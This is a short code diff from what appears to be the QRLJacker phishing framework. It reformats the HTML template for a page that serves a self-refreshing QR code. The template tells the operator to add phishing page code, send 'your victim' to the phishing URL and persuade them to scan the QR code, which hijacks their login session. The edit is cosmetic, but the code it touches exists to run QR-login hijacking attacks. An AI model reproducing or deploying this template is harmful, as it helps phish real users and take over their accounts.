@@ -374,18 +374,14 @@ def make( service_name , port , type="html" ):
 </head>
 <body>
 <script>
-var myTimer;
-myTimer = window.setInterval(reloadD,3000);
-function reloadD(){
-d = new Date();
-document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
-}
+var myTimer; myTimer = window.setInterval(reloadD,3000);
+function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();}
 </script>
 <center><h1><b>QRLJacker: """+str(service_name)+"""</b></h1>
-Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:</b>
-1. This is your always updated """+str(service_name)+""" QR Code</b>
-<img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;"></b>
-2. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)</b>
+Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
+</br>1. This is your always updated """+str(service_name)+""" QR Code
+</b><img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;">
+</br>2. Edit Index.html by adding your phishing page source code, style, resources, etc.. ("Index.html" located in the framework folder)
 </br>3. Point your victim to your phishing <a href='http://localhost:"""+str(port)+"""'>URL</a>, Convince to scan the QR code and Bob is your uncle!
 </center>
 </body>
@@ -398,18 +394,14 @@ Now you have a local webserver hosting your QRLJacking payload, Here's some inst
 </head>
 <body>
 <script>
-var myTimer;
-myTimer = window.setInterval(reloadD,3000);
-function reloadD(){
-d = new Date();
-document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();
-}
+var myTimer; myTimer = window.setInterval(reloadD,3000);
+function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();}
 </script>
 <center><h1><b>QRLJacker: """+str(service_name)+"""</b></h1>
-Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:</b>
-1. This is your always updated """+str(service_name)+""" QR Code</b>
-<img id="qrcodew" alt="Scan me!" src="tmp.svg" style="display: block;"></b>
-2. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)</b>
+Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
+</br>1. This is your always updated """+str(service_name)+""" QR Code
+</b><img id="qrcodew" alt="Scan me!" src="tmp.svg" style="display: block;">
+</br>2. Edit Index.html by adding your phishing page source code, style, resources, etc.. ("Index.html" located in the framework folder)
 </br>3. Point your victim to your phishing <a href='http://localhost:"""+str(port)+"""'>URL</a>, Convince to scan the QR code and Bob is your uncle!
 </center>
 </body>
